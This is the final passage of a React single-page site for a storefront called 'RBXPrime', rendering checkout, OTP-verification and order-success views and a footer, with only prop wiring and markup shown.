                        {currentView === 'checkout' && (
                            <CheckoutView 
                                username={username}
                                setUsername={setUsername}
                                email={email}
                                setEmail={setEmail}
                                phoneNumber={phoneNumber}
                                setPhoneNumber={setPhoneNumber}
                                isFreeOrder={isFreeOrder}
                                handleCheckout={handleCheckout}
                                isProcessing={isProcessing}
                                cartTotal={cartTotal}
                                cart={cart}
                                navigateTo={navigateTo}
                            />
                        )}
                        {currentView === 'otp-verify' && (
                            <OtpVerifyView 
                                phoneNumber={phoneNumber}
                                otp={otp}
                                setOtp={setOtp}
                                handleOtpSubmit={handleOtpSubmit}
                                isProcessing={isProcessing}
                                navigateTo={navigateTo}
                            />
                        )}
                        {currentView === 'success' && (
                            <SuccessView 
                                isFreeOrder={isFreeOrder}
                                username={username}
                                orderId={orderId}
                                navigateTo={navigateTo}
                            />
                        )}
                    </main>

                    {/* Footer (Always Visible) */}
                    <footer className="bg-black border-t border-white/10 pt-16 pb-8">
                        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                            <div className="flex flex-col md:flex-row justify-between items-center gap-6">
                                <div className="flex items-center gap-2">
                                    <div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center">
                                        <Gem className="text-black w-5 h-5" />
                                    </div>
                                    <span className="text-xl font-bold text-white">RBXPrime</span>
                                </div>
                                <p className="text-gray-600 text-sm">© 2024 RBXPrime. Systems Active.</p>
                                <div className="flex gap-4 opacity-50">
                                   <CreditCard className="w-6 h-6" />
                                </div>
                            </div>
                        </div>
                    </footer>
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
